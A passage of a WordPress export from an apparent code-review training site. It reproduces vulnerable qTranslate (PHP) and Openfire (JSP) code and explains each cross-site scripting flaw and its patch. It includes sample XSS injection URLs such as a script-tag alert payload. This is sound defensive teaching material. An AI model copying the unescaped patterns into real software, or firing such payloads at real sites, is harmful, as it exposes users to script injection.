                // check if content is available in default language, if not return first language found. (prevent empty result)
                if($lang!=$q_config['default_language'])
                        return "(".$q_config['language_name'][$q_config['default_language']].") ".qtrans_use($q_config['default_language'], $text, $show_available);
                foreach($content as $language =&gt; $lang_text) {
                        $lang_text = trim($lang_text);
                        if(!empty($lang_text)) {
                                return $lang_text;
                        }
                }
        }
        // display selection for available languages
        $available_languages = array_unique($available_languages);
        $language_list = "";
        if(preg_match('/%LANG:([^:]*):([^%]*)%/',$q_config['not_available'][$lang],$match)) {
                $normal_seperator = $match[1];
                $end_seperator = $match[2];
                // build available languages string backward
                $i = 0;
                foreach($available_languages as $language) {
                        if($i==1) $language_list  = $end_seperator.$language_list;
                        if($i&gt;1) $language_list  = $normal_seperator.$language_list;
                        $language_list = "&lt;a href=\"".qtrans_convertURL($_SERVER['REQUEST_URI'], $language)."\"&gt;".$q_config['language_name'][$language]."&lt;/a&gt;".

$language_list;
                        $i++;
                }
        }
        return "&lt;p&gt;".preg_replace('/%LANG:([^:]*):([^%]*)%/', $language_list, $q_config['not_available'][$lang])."&lt;/p&gt;";
}
 
?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>921</wp:post_id>
		<wp:post_date>2010-06-28 09:00:54</wp:post_date>
		<wp:post_date_gmt>2010-06-28 16:00:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>watched</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aHtfwj]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[0f29f8423daf9a20876ae00ab6d1f78f]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>549</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Watched &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/07/watched-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-07-02 08:04:33</wp:comment_date>
			<wp:comment_date_gmt>2010-07-02 15:04:33</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Watched [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Watched – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/07/watched-cross-site-scripting/</link>
		<pubDate>Fri, 02 Jul 2010 15:00:12 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=926</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: qTranslate  plugin

Fixed in Version: 2.0.2

Issue Type: XSS

Original Code: <a title="Watched" href="http://spotthevuln.com/2010/06/watched/" target="_blank">Found Here</a>
<h2>Description</h2>
Whew!  This is a lot of code for a simple change!  This bug affected the qTranslate plugin for WordPress.  The bug used the $_SERVER['REQUEST_URI'] variable without realizing it could contain arbitrary values supplied by an attacker.  The $_SERVER['REQUEST_URI'] variable is used directly in an HREF in the HTML markup, resulting in a classic XSS vulnerability.

The <a title="PHP Doc" href="http://php.net/manual/en/reserved.variables.server.php" target="_blank">PHP documentation </a>states that [‘REQUEST_URI’] represents:
<blockquote>The URI which was given in order to access this page; for instance, '/index.html'.</blockquote>
No escaping is done before returning the predefined value.  Also, [‘REQUEST_URI’] actually returns the file requested as well as any query string parameters in the URI.  For example, a request for <a href="http://server/index.php?blah=foo">http://server/index.php?blah=foo</a> will return ‘index.php?blah=foo’.  With this in mind, the attacker is free to set up arbitrary query string parameters which contain the XSS payload
<blockquote>http://server/qtranslate_widget.php?xss=”&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</blockquote>
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php
function qtrans_convertURL($url='', $lang='', $forceadmin = false) {
 global $q_config;
 
 // invalid language
 if($url=='') $url = clean_url($q_config['url_info']['url']);
 if($lang=='') $lang = $q_config['language'];
 if(defined('WP_ADMIN')&amp;&amp;!$forceadmin) return $url;
 if(!qtrans_isEnabled($lang)) return "";
 
 // &amp; workaround
 $url = str_replace('&amp;amp;','&amp;',$url);
 $url = str_replace('&amp;#038;','&amp;',$url);
 
 // check if it's an external link
 $urlinfo = qtrans_parseURL($url);
 $home = rtrim(get_option('home'),"/");
 if($urlinfo['host']!='') {
  // check for already existing pre-domain language information
  if($q_config['url_mode'] == QT_URL_DOMAIN &amp;&amp; preg_match("#^([a-z]{2}).#i",$urlinfo['host'],$match)) {
   if(qtrans_isEnabled($match[1])) {
    // found language information, remove it
    $url = preg_replace("/".$match[1]."\./i","",$url, 1);
    // reparse url
    $urlinfo = qtrans_parseURL($url);
   }
  }
  if(substr($url,0,strlen($home))!=$home) {
   return $url;
  }
  // strip home path
  $url = substr($url,strlen($home));
 } else {
  // relative url, strip home path
  $homeinfo = qtrans_parseURL($home);
  if($homeinfo['path']==substr($url,0,strlen($homeinfo['path']))) {
   $url = substr($url,strlen($homeinfo['path']));
  }
 }
 
 // check for query language information and remove if found
 if(preg_match("#(&amp;|\?)lang=([^&amp;\#]+)#i",$url,$match) &amp;&amp; qtrans_isEnabled($match[2])) {
  $url = preg_replace("#(&amp;|\?)lang=".$match[2]."&amp;?#i","$1",$url);
 }
 
 // remove any slashes out front
 $url = ltrim($url,"/");
 
 // remove any useless trailing characters
 $url = rtrim($url,"?&amp;");
 
 // reparse url without home path
 $urlinfo = qtrans_parseURL($url);
 
 // check if its a link to an ignored file type
 $ignore_file_types = preg_split('/\s*,\s*/',strtolower($q_config['ignore_file_types']));
 $pathinfo = pathinfo($urlinfo['path']);
 if(isset($pathinfo['extension']) &amp;&amp; in_array(strtolower($pathinfo['extension']), $ignore_file_types)) {
  return $home."/".$url;
 }
 
 switch($q_config['url_mode']) {
  case QT_URL_PATH: // pre url
   // might already have language information
   if(preg_match("#^([a-z]{2})/#i",$url,$match)) {
    if(qtrans_isEnabled ($match[1])) {
     // found language information, remove it
     $url = substr($url, 3);
    }
   }
   if($lang!=$q_config['default_language']) $url = $lang."/".$url;
   break;
  case QT_URL_DOMAIN: // pre domain
   if($lang!=$q_config['default_language']) $home = preg_replace("#//#","//".$lang.".",$home,1);
   break;
  default: // query
   if($lang!=$q_config['default_language']){
    if(strpos($url,'?')===false) {
     $url .= '?';
    } else {
     $url .= '&amp;';
    }
    $url .= "lang=".$lang;
   }
 }
 
 // see if cookies are activated
 if(!$q_config['cookie_enabled'] &amp;&amp; !$q_config['url_info']['internal_referer'] &amp;&amp; $urlinfo['path'] == '' &amp;&amp; $lang == $q_config['default_language'] &amp;&amp; $q_config['language'] != $q_config['default_language']) {
  // :( now we have to make unpretty URLs
  $url = preg_replace("#(&amp;|\?)lang=".$match[2]."&amp;?#i","$1",$url);
  if(strpos($url,'?')===false) {
   $url .= '?';
  } else {
   $url .= '&amp;';
  }
  $url .= "lang=".$lang;
 }
 
 // &amp;amp; workaround
 $complete = str_replace('&amp;','&amp;amp;',$home."/".$url);
 return $complete;
}

...&lt;SNIP...

function qtrans_use($lang, $text, $show_available=false) {
        global $q_config;
        // return full string if language is not enabled
        if(!qtrans_isEnabled($lang)) return $text;
        if(is_array($text)) {
                // handle arrays recursively
                foreach($text as $key =&gt; $t) {
                        $text[$key] = qtrans_use($lang,$text[$key],$show_available);
                }
                return $text;
        }
        
        if(is_object($text)) {
                foreach(get_object_vars($text) as $key =&gt; $t) {
                        $text-&gt;$key = qtrans_use($lang,$text-&gt;$key,$show_available);
                }
                return $text;
        }
        
        // get content
        $content = qtrans_split($text);
        // find available languages
        $available_languages = array();
        foreach($content as $language =&gt; $lang_text) {
                $lang_text = trim($lang_text);
                if(!empty($lang_text)) $available_languages[] = $language;
        }
        
        // if no languages available show full text
        if(sizeof($available_languages)==0) return $text;
        // if content is available show the content in the requested language
        $content[$lang] = trim($content[$lang]);
        if(!empty($content[$lang])) {
                return $content[$lang];
        }
        // content not available in requested language (bad!!) what now?
        if(!$show_available){
                // check if content is available in default language, if not return first language found. (prevent empty result)
                if($lang!=$q_config['default_language'])
                        return "(".$q_config['language_name'][$q_config['default_language']].") ".qtrans_use($q_config['default_language'], $text, $show_available);
                foreach($content as $language =&gt; $lang_text) {
                        $lang_text = trim($lang_text);
                        if(!empty($lang_text)) {
                                return $lang_text;
                        }
                }
        }
        // display selection for available languages
        $available_languages = array_unique($available_languages);
        $language_list = "";
        if(preg_match('/%LANG:([^:]*):([^%]*)%/',$q_config['not_available'][$lang],$match)) {
                $normal_seperator = $match[1];
                $end_seperator = $match[2];
                // build available languages string backward
                $i = 0;
                foreach($available_languages as $language) {
                        if($i==1) $language_list  = $end_seperator.$language_list;
                        if($i&gt;1) $language_list  = $normal_seperator.$language_list;
-                        $language_list = "&lt;a href=\"".qtrans_convertURL($_SERVER['REQUEST_URI'], $language)."\"&gt;".$q_config['language_name'][$language]."&lt;/a&gt;".$language_list;
+                       $language_list = "&lt;a href=\"".qtrans_convertURL('', $language)."\"&gt;".$q_config['language_name'][$language]."&lt;/a&gt;".$language_list;
                        $i++;
                }
        }
        return "&lt;p&gt;".preg_replace('/%LANG:([^:]*):([^%]*)%/', $language_list, $q_config['not_available'][$lang])."&lt;/p&gt;";
}
 
?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>926</wp:post_id>
		<wp:post_date>2010-07-02 08:00:12</wp:post_date>
		<wp:post_date_gmt>2010-07-02 15:00:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>watched-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="arbitrary-values"><![CDATA[arbitrary values]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php-documentation"><![CDATA[php documentation]]></category>
		<category domain="post_tag" nicename="query-string"><![CDATA[query string]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="string-parameters"><![CDATA[string parameters]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[e2c6be61db0fc3e9575af717733d1f18]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/buQCK6]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Weird Clothes</title>
		<link>http://spotthevuln.com/2010/07/weird-clothes/</link>
		<pubDate>Mon, 05 Jul 2010 15:00:52 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=930</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Nothing separates the generations more than music. By  the time a child is eight or nine, he has developed a passion for his  own music that is even stronger than his passions for procrastination  and weird clothes.</strong>
<strong> -Bill Cosby
</strong></blockquote>
[ccnLe_java]

&lt;%  // Get parameters
int start = ParamUtils.getIntParameter(request,"start",0);
int range = ParamUtils.getIntParameter(request,"range",webManager.getRowsPerPage("group-summary", 15));

if (request.getParameter("range") != null) {
webManager.setRowsPerPage("group-summary", range);
}

int groupCount = webManager.getGroupManager().getGroupCount();
Collection&lt;Group&gt; groups = webManager.getGroupManager().getGroups(start, range);

String search = null;
if (webManager.getGroupManager().isSearchSupported() &amp;&amp; request.getParameter("search") != null
&amp;&amp; !request.getParameter("search").trim().equals(""))
{
search = request.getParameter("search");
// Use the search terms to get the list of groups and group count.
groups = webManager.getGroupManager().search(search, start, range);
// Get the count as a search for *all* groups. That will let us do pagination even
// though it's a bummer to execute the search twice.
groupCount = webManager.getGroupManager().search(search).size();
}

// paginator vars
int numPages = (int)Math.ceil((double)groupCount/(double)range);
int curPage = (start/range) + 1;
%&gt;

&lt;%  if (request.getParameter("deletesuccess") != null) { %&gt;

&lt;div class="jive-success"&gt;
&lt;table cellpadding="0" cellspacing="0" border="0"&gt;
&lt;tbody&gt;
&lt;tr&gt;&lt;td class="jive-icon"&gt;&lt;img src="images/success-16x16.gif" width="16" height="16" border="0" alt=""&gt;&lt;/td&gt;
&lt;td class="jive-icon-label"&gt;
&lt;fmt:message key="group.summary.delete_group" /&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;&lt;br&gt;

&lt;%  } %&gt;

&lt;% if (webManager.getGroupManager().isSearchSupported()) { %&gt;

&lt;form action="group-summary.jsp" method="get" name="searchForm"&gt;
&lt;table border="0" width="100%" cellpadding="0" cellspacing="0"&gt;
&lt;tr&gt;
&lt;td valign="bottom"&gt;
&lt;fmt:message key="group.summary.total_group" /&gt; &lt;b&gt;&lt;%= groupCount %&gt;&lt;/b&gt;
&lt;%  if (numPages &gt; 1) { %&gt;

, &lt;fmt:message key="global.showing" /&gt; &lt;%= LocaleUtils.getLocalizedNumber(start+1) %&gt;-&lt;%= LocaleUtils.getLocalizedNumberstartrange &gt; groupCount ? groupCount:start+range) %&gt;

&lt;%  } %&gt;
&lt;/td&gt;
&lt;td align="right" valign="bottom"&gt;
&lt;fmt:message key="group.summary.search" /&gt;: &lt;input type="text" size="30" maxlength="150" name="search" value="&lt;%= ((search!=null) ? search : "") %&gt;"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/form&gt;

&lt;script language="JavaScript" type="text/javascript"&gt;
document.searchForm.search.focus();
&lt;/script&gt;

&lt;% }
// Otherwise, searching is not supported.
else {
%&gt;
&lt;p&gt;
&lt;fmt:message key="group.summary.total_group" /&gt; &lt;b&gt;&lt;%= groupCount %&gt;&lt;/b&gt;
&lt;%  if (numPages &gt; 1) { %&gt;

, &lt;fmt:message key="global.showing" /&gt; &lt;%= (start+1) %&gt;-&lt;%= (start+range) %&gt;

&lt;%  } %&gt;
&lt;/p&gt;
&lt;% } %&gt;

&lt;%  if (numPages &gt; 1) { %&gt;

&lt;p&gt;
&lt;fmt:message key="global.pages" /&gt;
[
&lt;%  for (int i=0; i&lt;numPages; i++) {
String sep = ((i+1)&lt;numPages) ? " " : "";
boolean isCurrent = (i+1) == curPage;
%&gt;
&lt;a href="group-summary.jsp?start=&lt;%= (i*range) %&gt;&lt;%= search!=null? "&amp;search=" + URLEncoder.encode(search, "UTF-8") : ""%&gt;"
class="&lt;%= ((isCurrent) ? "jive-current" : "") %&gt;"
&gt;&lt;%= (i+1) %&gt;&lt;/a&gt;&lt;%= sep %&gt;

&lt;%  } %&gt;
]
&lt;/p&gt;

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>930</wp:post_id>
		<wp:post_date>2010-07-05 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-07-05 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>weird-clothes</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[ac265cd74294e7f8841d878a917470a1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cv2WgY]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>556</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Weird Clothes &#8211; Cross Site Scripting ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/07/weird-clothes-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-07-09 15:58:52</wp:comment_date>
			<wp:comment_date_gmt>2010-07-09 22:58:52</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Weird Clothes [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Weird Clothes – Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/07/weird-clothes-cross-site-scripting/</link>
		<pubDate>Fri, 09 Jul 2010 22:58:45 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=933</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Openfire by Ignite Realtime

Fixed in Version: 3.6.3

Issue Type: XSS

Original Code: <a title="Weird Clothes" href="http://spotthevuln.com/2010/07/weird-clothes/" target="_blank">Found  Here</a>
<h2>Description</h2>
XSS bug in Openfire by Ignite Realtime.  Openfire is an Open Source, real time collaboration server.  The bug is very straightforward and a simple string like the one presented below takes advantage of the vulnerability.
<blockquote>http://www.example.com/group-summary.jsp?search=%22%3E%3C[xss]</blockquote>
This bug was actually part of a number of security bugs reported by Core Security Technologies.  You can read their advisory <a title="Core" href="http://www.coresecurity.com/content/openfire-multiple-vulnerabilities" target="_blank">here</a>.

The patch simply HTML encodes the tainted search parameter…
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;%  // Get parameters
int start = ParamUtils.getIntParameter(request,"start",0);
int range = ParamUtils.getIntParameter(request,"range",webManager.getRowsPerPage("group-summary", 15));

if (request.getParameter("range") != null) {
webManager.setRowsPerPage("group-summary", range);
}

int groupCount = webManager.getGroupManager().getGroupCount();
Collection&lt;Group&gt; groups = webManager.getGroupManager().getGroups(start, range);

String search = null;
if (webManager.getGroupManager().isSearchSupported() &amp;&amp; request.getParameter("search") != null
&amp;&amp; !request.getParameter("search").trim().equals(""))
{
search = request.getParameter("search");
+    // Santize variables to prevent vulnerabilities
+    search = StringUtils.escapeHTMLTags(search);

// Use the search terms to get the list of groups and group count.
groups = webManager.getGroupManager().search(search, start, range);
// Get the count as a search for *all* groups. That will let us do pagination even
// though it's a bummer to execute the search twice.
groupCount = webManager.getGroupManager().search(search).size();
}

// paginator vars
int numPages = (int)Math.ceil((double)groupCount/(double)range);
int curPage = (start/range) + 1;
%&gt;

&lt;%  if (request.getParameter("deletesuccess") != null) { %&gt;

&lt;div class="jive-success"&gt;
&lt;table cellpadding="0" cellspacing="0" border="0"&gt;
&lt;tbody&gt;
&lt;tr&gt;&lt;td class="jive-icon"&gt;&lt;img src="images/success-16x16.gif" width="16" height="16" border="0" alt=""&gt;&lt;/td&gt;
&lt;td class="jive-icon-label"&gt;
&lt;fmt:message key="group.summary.delete_group" /&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;&lt;br&gt;

&lt;%  } %&gt;

&lt;% if (webManager.getGroupManager().isSearchSupported()) { %&gt;

&lt;form action="group-summary.jsp" method="get" name="searchForm"&gt;
&lt;table border="0" width="100%" cellpadding="0" cellspacing="0"&gt;
&lt;tr&gt;
&lt;td valign="bottom"&gt;
&lt;fmt:message key="group.summary.total_group" /&gt; &lt;b&gt;&lt;%= groupCount %&gt;&lt;/b&gt;
&lt;%  if (numPages &gt; 1) { %&gt;

, &lt;fmt:message key="global.showing" /&gt; &lt;%= LocaleUtils.getLocalizedNumber(start+1) %&gt;-&lt;%= LocaleUtils.getLocalizedNumberstartrange &gt; groupCount ? groupCount:start+range) %&gt;

&lt;%  } %&gt;
&lt;/td&gt;
&lt;td align="right" valign="bottom"&gt;
&lt;fmt:message key="group.summary.search" /&gt;: &lt;input type="text" size="30" maxlength="150" name="search" value="&lt;%= ((search!=null) ? search : "") %&gt;"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/form&gt;

&lt;script language="JavaScript" type="text/javascript"&gt;
document.searchForm.search.focus();
&lt;/script&gt;

&lt;% }
// Otherwise, searching is not supported.
else {
%&gt;
&lt;p&gt;
&lt;fmt:message key="group.summary.total_group" /&gt; &lt;b&gt;&lt;%= groupCount %&gt;&lt;/b&gt;
&lt;%  if (numPages &gt; 1) { %&gt;

, &lt;fmt:message key="global.showing" /&gt; &lt;%= (start+1) %&gt;-&lt;%= (start+range) %&gt;

&lt;%  } %&gt;
&lt;/p&gt;
&lt;% } %&gt;

&lt;%  if (numPages &gt; 1) { %&gt;

&lt;p&gt;
&lt;fmt:message key="global.pages" /&gt;
[
&lt;%  for (int i=0; i&lt;numPages; i++) {
String sep = ((i+1)&lt;numPages) ? " " : "";
boolean isCurrent = (i+1) == curPage;
%&gt;
&lt;a href="group-summary.jsp?start=&lt;%= (i*range) %&gt;&lt;%= search!=null? "&amp;search=" + URLEncoder.encode(search, "UTF-8") : ""%&gt;"
class="&lt;%= ((isCurrent) ? "jive-current" : "") %&gt;"
&gt;&lt;%= (i+1) %&gt;&lt;/a&gt;&lt;%= sep %&gt;

&lt;%  } %&gt;
]
&lt;/p&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>933</wp:post_id>
		<wp:post_date>2010-07-09 15:58:45</wp:post_date>
		<wp:post_date_gmt>2010-07-09 22:58:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>weird-clothes-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="collaboration-server"><![CDATA[collaboration server]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="jsp"><![CDATA[JSP]]></category>
		<category domain="category" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="post_tag" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="post_tag" nicename="search-parameter"><![CDATA[search parameter]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[3bf2a61107a52bfdd0fcd726eb8805ab]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/a0foeK]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
